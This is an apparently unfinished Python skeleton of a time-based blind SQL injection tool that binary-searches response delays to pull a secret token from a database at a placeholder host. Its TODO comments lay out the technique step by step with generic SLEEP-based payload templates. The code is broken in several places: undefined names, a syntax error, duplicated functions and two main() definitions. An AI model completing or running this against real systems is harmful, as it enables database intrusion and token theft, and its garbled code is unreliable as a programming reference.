import asyncio
import time
import httpx
from urllib.parse import quote

API_KEY = "316fc053-5f69-42cc-826c-8edf9b2e530e"
BASE_URL = "http://target.host"  # Change to target IP/FQDN
SLEEP_TIME = 5
TIME_THRESHOLD = 4.5  # seconds to consider delay meaningful

### TODO: Need charset defined


async def is_slow(client: httpx.AsyncClient, injected_path: str) -> bool:
    """Send POST request to injected path and determine if it causes delay."""
    url = f"{BASE_URL}{p}"
    start = time.monotonic()
    await client.post(url)
    elapsed = time.monotonic() - start
    return elapsed > TIME_THRESHOLD


async def find_token_length(client: httpx.AsyncClient, max_len: int = 64) -> int:
    """Binary search for token length where user_id = 1."""
    lo = 1
    hi = max_len

    while lo <= hi:
        mid = (lo + hi) // 2
        payload = (
            # TODO: modify as needed
            # # Time-based blind SQL injection condition:
            #
            # This payload checks if a specific condition is true (e.g., the length of a token,
            # or the ASCII value of a character at a given position in a string).
            #
            # If the condition is true, it causes the database to delay the response (using a sleep function),
            # otherwise it returns immediately. The presence or absence of the delay is used to infer data.
            #
            # The structure follows this logic:
            #
            # 1. Embed a SELECT statement that retrieves a specific value from the database
            #    (e.g., a token, password hash, email, etc.).
            #
            # 2. Apply a test condition on that value:
            #    - Is the length equal to X?
            #    - Is the Nth character greater than a given ASCII value?
            #
            # 3. Use a conditional expression to evaluate the result:
            #    IF (condition) THEN sleep(delay)
            #    ELSE sleep(0) or return immediately
            #
            # 4. Inject the full conditional into a path/query parameter such that
            #    the surrounding SQL query remains valid and the conditional executes.
            #
            # The response time is measured in code to determine if the condition was true,
            # allowing character-by-character or bit-by-bit extraction without relying
            # on visible output or error messages.
            # <base_value> AND (
            #     SELECT CASE
            #         WHEN (LENGTH((SELECT <hidden_value> FROM <source> WHERE <filter_condition>)) = <candidate_length>)
            #         THEN SLEEP(<delay_time>)
            #         ELSE SLEEP(0)
            #     END
            # )
       )
        # payload need encoding?
        encoded = quote(payload)
        if await is_slow(client, encoded):
            print(f"[✓] Token length found: {mid}")
            return mid
        else:
            # Try next
            hi -= 1

    raise Exception("[-] Failed to find token length.")


async def extract_char_at_pos(
    client: httpx.AsyncClient,
    pos: int,
    charset: list[str] = CUSTOM_CHARSET,
) -> str:
    """Binary search for the character at a given token position (1-based)."""
    lo = 0
    hi = len(charset) - 1
    attempts = 0

    while lo <= hi:
        mid = (lo + hi) // 2
        c = charset[mid]
        mid_ord = ord(c)

        payload = (
            # TODO: payload needed here
            # SEE BELOW FOR INSTRUCTIONS
        )
        # TODO: need encoding?
        encoded = quote(payload)

        if await is_slow(client, encoded):
            lo = mid + 1
        else:
            hi = mid - 1

        attempts += 1

    final_char = charset[lo] if 0 <= lo < len(charset) else "?"
    print(f"[POS {pos:02}] -> '{final_char}' in {attempts} attempts")
    return final_char


async def extract_token(client: httpx.AsyncClient, max_len: int = 64) -> str:
    """Find token length, then extract token from database."""
    print("[*] Finding token length...")
    token_len = await find_token_length(client, max_len)

    print(f"[*] Extracting token of length {token_len}...")
    token_chars = []
    for pos in range(1, token_len + 1):
        c = await extract_char_at_pos(client, pos)
        token_chars.append(c)
        print(f"[+] token[{pos:02}] = '{c}' -> {''.join(token_chars)}")
    return "".join(token_chars)


async def is_slow(client: httpx.AsyncClient, injected_path: str) -> bool:
    # TODO: fill out url
    url = f"{BASE_URL}{}"
    # TODO: payload =
    start = time.monotonic()
    # TODO: add payload to POST
    # TODO: what if get request?
    await client.post(url)
    elapsed = time.monotonic() - start
    return elapsed > TIME_THRESHOLD


async def extract_char_at_pos(
    client: httpx.AsyncClient,
    pos: int,
    semaphore: asyncio.Semaphore,
    charset: List[str] = CUSTOM_CHARSET,
) -> str:
    lo = 0
    hi = len(charset) - 1
    attempts = 0

    async with semaphore:
        while lo <= hi:
            mid = (lo + hi) // 2
            mid_char = charset[mid]
            mid_ord = ord(mid_char)

            payload = (
                # TODO: payload goes here
                # Time-based blind SQL injection for extracting a secret value (e.g., token, password hash):
                #
                # 1. Identify a way to inject a conditional expression into a SQL query, such that
                #    you can control the logic and measure how long the server takes to respond.
                #
                # 2. Use a subquery to select the secret value from the database.
                #
                # 3. Extract a single character from the value at a known position.
                #    - For example: get the Nth character of the value.
                #
                # 4. Convert that character to its numeric form (e.g., ASCII code).
                #
                # 5. Compare the numeric value to a threshold using a greater-than, less-than, or equality test.
                #    - This will help narrow down what the character is using binary search.
                #
                # 6. Wrap the comparison in a conditional logic block.
                #    - If the condition is true, make the database sleep (e.g., pause for 5 seconds).
                #    - If false, return immediately.
                #
                # 7. URL/Base64-encode the entire payload and inject it into the target input (optional).
                #
                # 8. Measure the server’s response time to determine whether a delay occurred.
                #    - If the server was slow, the condition was true.
                #    - If the server responded quickly, the condition was false.
                #
                # 9. Adjust the threshold value using binary search until the correct character is identified.
                #
                # 10. Repeat steps 3–9 for each character position until the full secret is recovered.
                # <base_value> AND (
                #     SELECT CASE
                #         WHEN (ASCII(SUBSTRING((SELECT <hidden_value> FROM <source> WHERE <filter_condition>), <position>, 1)) > <reference_value>)
                #         THEN SLEEP(<delay_time>)
                #         ELSE SLEEP(0)
                #     END
                # )
            )
            # TODO: need encoding?
            encoded = quote(payload)

            if await is_slow(client, encoded):
                lo = mid + 1
            else:
                hi = mid - 1

            attempts += 1

    final_char = charset[lo] if 0 <= lo < len(charset) else "?"
    print(f"[POS {pos:02}] → '{final_char}' in {attempts} attempts")
    return pos, final_char


async def extract_token_parallel(client: httpx.AsyncClient, token_len: int = 64) -> str:
    semaphore = asyncio.Semaphore(MAX_CONCURRENCY)
    tasks = [
        extract_char_at_pos(client, pos, semaphore) for pos in range(1, token_len + 1)
    ]
    results = await asyncio.gather(*tasks)
    sorted_chars = [char for _, char in sorted(results, key=lambda x: x[0])]
    token = "".join(sorted_chars)
    print(f"\n[✓] Final token: {token}")
    return token


# If using fully parallel version
async def main():
    async with httpx.AsyncClient(timeout=SLEEP_TIME + 10) as client:
        await extract_token_parallel(client, token_len=64)


async def main():
    async with httpx.AsyncClient(timeout=SLEEP_TIME + 10) as client:
        token = await extract_token(client, max_len=64)
        print(f"Final token: {token}")


if __name__ == "__main__":
    asyncio.run(main())
